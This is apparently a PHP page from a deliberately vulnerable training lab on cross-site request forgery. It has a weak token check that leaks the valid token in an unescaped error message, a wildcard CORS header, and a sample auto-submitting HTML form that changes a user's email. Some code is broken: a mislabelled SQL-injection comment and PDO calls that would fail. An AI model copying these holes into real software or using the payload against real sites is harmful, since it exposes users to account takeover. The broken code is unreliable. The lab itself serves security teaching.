<?php
$page_title = "CSRF Lab 2 - Profile Update CSRF";
require_once '../../../config/env.php';
require_once '../../../template/header.php';

function uuidv4()
{
  $data = random_bytes(16);

  $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // set version to 0100
  $data[8] = chr(ord($data[8]) & 0x3f | 0x80); // set bits 6-7 to 10
    
  return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
$csrf = uuidv4();
$dateNow = strtotime(date('Y-m-d H:i:s'));
$_SESSION['session_'.$dateNow] = $csrf;

header("Access-Control-Allow-Origin: *");

$message = '';



// VULNERABLE CODE - URL Parameter SQL Injection
$query = "SELECT * FROM users WHERE id = 3";

try {
    $result = $pdo->query($query);
    if ($result) {
        $user_data = $result->fetch(PDO::FETCH_ASSOC);
    }
} catch (PDOException $e) {
    $error_message = "Database error: " . $e->getMessage();
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'] ?? '';
    $username = $_POST['username'] ?? '';
    $csrfToken = $_POST['csrf'] ?? '';

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $message = "Invalid email format";
    }
    if (!preg_match("/^[a-zA-Z-' ]*$/", $username)) {
        $message = "Invalid input username";
    }

    
    if(count(explode(';', $csrfToken))!=2){
        $message = 'Token missmatch '.$csrf.' '.$csrfToken;
    }else{
        if($_SESSION['session_'.explode(';', $csrfToken)[1]] != explode(';', $csrfToken)[0]){
            // var_dump($csrf, $csrfToken);
            $message = 'Token missmatch '.$csrf.' '.$csrfToken;
        }
    }
    if($message == ''){
        $sql =  "UPDATE users SET username = :username, email = :email WHERE id = 3";
        $pdo->prepare($sql);
        $pdo->bindValue('username', $username);
        $pdo->bindValue('email', $email);
        $pdo->execute();
        $message = "Update profile successful";
    }
}
?>

<div class="container-fluid">
    <div class="row">
        <div class="col-md-3 col-lg-2 px-0">
            <?php include '../../../template/nav.php'; ?>
        </div>

        <div class="col-md-9 col-lg-10 mt-60">
            <div class="container-fluid py-4">
                <div class="row">
                    <div class="col-12">
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="<?php echo BASE_URL; ?>">Dashboard</a></li>
                                <li class="breadcrumb-item"><a href="../">CSRF</a></li>
                                <li class="breadcrumb-item active">Lab 2</li>
                            </ol>
                        </nav>

                        <div class="d-flex justify-content-between align-items-center mb-4">
                            <h1 class="h2">Lab 2: CSRF via Profile Update</h1>
                            <span class="lab-difficulty difficulty-medium">Medium</span>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0">Update Profile</h5>
                            </div>
                            <div class="card-body">
                                <?php if ($message): ?>
                                    <div class="alert alert-info" role="alert">
                                        <?php echo $message; ?>
                                    </div>
                                <?php endif; ?>

                                <form method="post">
                                    <div class="mb-3">
                                        <label for="name" class="form-label">Username:</label>
                                        <input type="text" class="form-control" id="username" name="username" value="<?php echo htmlspecialchars($user_data['username']); ?>" required>
                                    </div>

                                    <input type="text" class="form-control" id="csrf" name="csrf" value="<?php echo $csrf.';'.$dateNow ?>" hidden readonly>
                                    <div class="mb-3">
                                        <label for="email" class="form-label">Email:</label>
                                        <input type="email" class="form-control" id="email" name="email" value="<?php echo htmlspecialchars($user_data['email']); ?>" required>
                                    </div>

                                    <button type="submit" class="btn btn-primary">Update Profile</button>
                                </form>
                            </div>
                        </div>
                    </div>

                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">
                                <h5 class="mb-0">💡 Lab Objectives</h5>
                            </div>
                            <div class="card-body">
                                <ul class="list-unstyled">
                                    <li>✅ Exploit profile update</li>
                                    <li>✅ Understand data modification</li>
                                    <li>✅ Create attack scenario</li>
                                </ul>
                            </div>
                        </div>

                        <div class="card mt-3">
                            <div class="card-header">
                                <h5 class="mb-0">🛠️ CSRF Attack Vector</h5>
                            </div>
                            <div class="card-body">
                                <div class="accordion" id="scenarioAccordion">
                                    <div class="accordion-item">
                                        <h2 class="accordion-header">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#scenario">
                                                Malicious HTML
                                            </button>
                                        </h2>
                                        <div id="scenario" class="accordion-collapse collapse" data-bs-parent="#scenarioAccordion">
                                            <div class="accordion-body">
                                                <code>
                                                    &lt;form method="post" action="http://localhost:8000/pages/csrf/lab-2/index.php" id="csrfForm"&gt;<br>
                                                    &lt;input type="hidden" name="username" value="Johnd"&gt;<br>
                                                    &lt;input type="hidden" name="email" value="attacker@example.com"&gt;<br>
                                                    &lt;/form&gt;<br>
                                                    &lt;script&gt;<br>
                                                    document.getElementById('csrfForm').submit();<br>
                                                    &lt;/script&gt;
                                                </code>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php require_once '../../../template/footer.php'; ?>